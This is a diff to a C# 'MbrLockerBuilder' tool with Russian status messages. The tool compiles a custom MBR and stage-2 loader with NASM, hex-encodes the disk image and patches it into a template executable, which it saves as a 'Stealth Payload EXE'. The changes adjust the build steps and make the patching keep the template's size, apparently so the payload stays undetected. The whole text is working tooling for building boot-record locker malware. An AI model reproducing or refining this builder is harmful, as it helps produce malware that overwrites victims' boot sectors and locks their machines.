@@ -300,7 +300,7 @@ namespace MbrLockerBuilder
         {
             try
             {
-                this.lblStatus.Text = "1/8 Поиск ресурсов...";
+                this.lblStatus.Text = "1/7 Поиск ресурсов...";
                 Application.DoEvents();
 
                 string nasmPath = FindResourceByPartialName("nasm", "nasm.exe");
@@ -313,7 +313,7 @@ namespace MbrLockerBuilder
                         throw new Exception("NASM не найден!");
                 }
 
-                this.lblStatus.Text = "2/8 Компиляция MBR...";
+                this.lblStatus.Text = "2/7 Компиляция MBR...";
                 Application.DoEvents();
 
                 string mbrAsm = this.GenerateMBR();
@@ -326,7 +326,7 @@ namespace MbrLockerBuilder
                 if (mbrBytes.Length != 512)
                     throw new Exception($"MBR size: {mbrBytes.Length} != 512");
 
-                this.lblStatus.Text = "3/8 Компиляция Stage2...";
+                this.lblStatus.Text = "3/7 Компиляция Stage2...";
                 Application.DoEvents();
 
                 string stage2Asm = this.GenerateStage2();
@@ -337,7 +337,7 @@ namespace MbrLockerBuilder
                 RunNasm(nasmPath, stage2Path, stage2BinPath);
                 byte[] stage2Bytes = File.ReadAllBytes(stage2BinPath);
 
-                this.lblStatus.Text = "4/8 Сборка образа...";
+                this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
                 int totalSectors = 16;
@@ -345,12 +345,18 @@ namespace MbrLockerBuilder
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
 
-                this.lblStatus.Text = "5/8 Конвертация в HEX...";
+                this.lblStatus.Text = "5/7 Конвертация в HEX...";
                 Application.DoEvents();
 
                 string hex = BitConverter.ToString(fullImage).Replace("-", "");
 
-                this.lblStatus.Text = "6/8 Поиск template.exe...";
+                // Проверяем длину HEX
+                if (hex.Length != 16384)
+                {
+                    throw new Exception($"HEX длина: {hex.Length}, ожидалось 16384");
+                }
+
+                this.lblStatus.Text = "6/7 Поиск template.exe...";
                 Application.DoEvents();
 
                 byte[] templateBytes = FindResourceBytesByPartialName("template");
@@ -363,13 +369,10 @@ namespace MbrLockerBuilder
                         throw new Exception("template.exe не найден!");
                 }
 
-                this.lblStatus.Text = "7/8 Патчинг шаблона...";
+                this.lblStatus.Text = "7/7 Патчинг шаблона (без изменения размера)...";
                 Application.DoEvents();
 
                 byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);
-
-                this.lblStatus.Text = "8/8 Сохранение...";
-                Application.DoEvents();
 
                 this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
                 this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
@@ -654,16 +657,17 @@ dw 0xAA55";
             if (markerPos == -1)
                 throw new Exception("Маркер {MBR_DATA} не найден!");
 
-            byte[] result = new byte[templateBytes.Length - marker.Length + mbrHex.Length];
+            // Проверяем длину HEX
+            if (mbrHex.Length != 16384)
+                throw new Exception($"HEX длина: {mbrHex.Length}, ожидалось 16384");
 
-            Array.Copy(templateBytes, 0, result, 0, markerPos);
+            // Создаём копию templateBytes (не меняем размер!)
+            byte[] result = new byte[templateBytes.Length];
+            Array.Copy(templateBytes, 0, result, 0, templateBytes.Length);
 
+            // Записываем HEX-строку ПОВЕРХ маркера
             byte[] hexBytes = Encoding.ASCII.GetBytes(mbrHex);
             Array.Copy(hexBytes, 0, result, markerPos, hexBytes.Length);
-
-            int afterMarker = markerPos + marker.Length;
-            int remaining = templateBytes.Length - afterMarker;
-            Array.Copy(templateBytes, afterMarker, result, markerPos + hexBytes.Length, remaining);
 
             return result;
         }
